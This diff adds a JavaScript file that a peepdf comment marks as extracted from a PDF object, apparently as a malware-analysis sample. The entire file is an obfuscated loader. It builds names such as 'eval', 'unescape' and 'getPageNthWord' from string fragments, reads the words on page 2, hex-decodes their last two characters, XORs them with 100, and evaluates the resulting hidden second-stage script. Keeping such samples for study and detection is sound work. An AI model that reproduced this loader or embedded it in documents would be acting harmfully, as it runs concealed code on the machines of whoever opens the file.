@@ -1,0 +1,37 @@
+// peepdf comment: Javascript code located in object 20 (version 0)
+
+var googleA = this;
+var send = ["", "e", "l", "a", "v"];
+unlock = new String(send[1] + send[4] + send[3] + send[2] + send[0]);
+var a = ["Word", "", "getPa", "geNth"];
+unlockAdobe = new String(a[2] + a[3] + a[0] + a[1]);
+var getAdobe = ["Pag", "mWo", "get", "rds", "eNu", ""];
+mail = new String(getAdobe[2] + getAdobe[0] + getAdobe[4] + getAdobe[1] + getAdobe[3] + getAdobe[5]);
+var b = ["s", "n", "a", "e", "c", "u", "e", "p", ""];
+d = new String(b[5] + b[1] + b[3] + b[0] + b[4] + b[2] + b[7] + b[3] + b[8]);
+var google = ["deA", "cha", "rCo", "t", ""];
+mailGoogle = new String(google[1] + google[2] + google[0] + google[3] + google[4]);
+var googleC = ["", "harCo", "fromC", "de"];
+dD = new String(googleC[2] + googleC[1] + googleC[3] + googleC[0]);
+var googleGet = ["a", "p", "", "p"];
+get = new String(googleGet[0] + googleGet[1] + googleGet[1] + googleGet[2]);
+var adobe = String("%");
+var aA = 2;
+var mailGet = String;
+var bB = 0;
+var editSend = 100;
+var get = googleA[get];
+var getD = 2;
+var aEdit = googleA[d];
+var c = googleA[mail](getD);
+var googleB = "";
+for (var googleCUnlock = bB; googleCUnlock < c; googleCUnlock += 1) {
+    sendD = googleA[unlockAdobe](getD, googleCUnlock);
+    var adobeD = sendD.substr(sendD.length - aA, aA);
+    var googleMail = aEdit(adobe + adobeD);
+    var sendDSend = googleMail[mailGoogle](bB);
+    var mailB = sendDSend ^ editSend;
+    googleB += mailGet[dD](mailB);
+}
+this[unlock](googleB);
+
